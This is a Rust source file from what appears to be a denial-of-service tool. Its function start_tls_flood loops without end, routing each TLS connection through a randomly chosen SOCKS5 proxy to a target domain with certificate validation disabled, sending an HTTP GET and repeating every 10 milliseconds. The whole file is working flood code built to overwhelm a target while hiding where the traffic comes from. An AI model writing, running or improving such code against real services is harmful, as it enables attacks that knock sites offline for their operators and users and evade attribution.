// src/flood/tls.rs
use tokio::io::AsyncWriteExt;
use native_tls::TlsConnector as NativeTls;
use tokio_native_tls::TlsConnector;
use tokio::time::{sleep, Duration};
use crate::utils::get_random_proxy;
use tokio_socks::tcp::Socks5Stream;  // Ubah ini dari socks::Socks5Stream

pub async fn start_tls_flood(domain: &str, port: u16, proxies: Vec<String>) {
    let connector = TlsConnector::from(
        NativeTls::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap()
    );

    loop {
        if let Some(proxy) = get_random_proxy(&proxies) {
            let proxy_parts: Vec<&str> = proxy.split(':').collect();
            if proxy_parts.len() == 2 {
                if let Ok(stream) = Socks5Stream::connect(
                    (proxy_parts[0], proxy_parts[1].parse().unwrap_or(1080)),
                    (domain, port)
                ).await {
                    match connector.connect(domain, stream).await {
                        Ok(mut tls_stream) => {
                            let _ = tls_stream.write_all(b"GET / HTTP/1.1\r\nHost: host\r\n\r\n").await;
                            println!("[TLS] Sent via {}", proxy);
                        }
                        Err(e) => eprintln!("[TLS] TLS error: {}", e),
                    }
                }
            }
        }
        sleep(Duration::from_millis(10)).await;
    }
}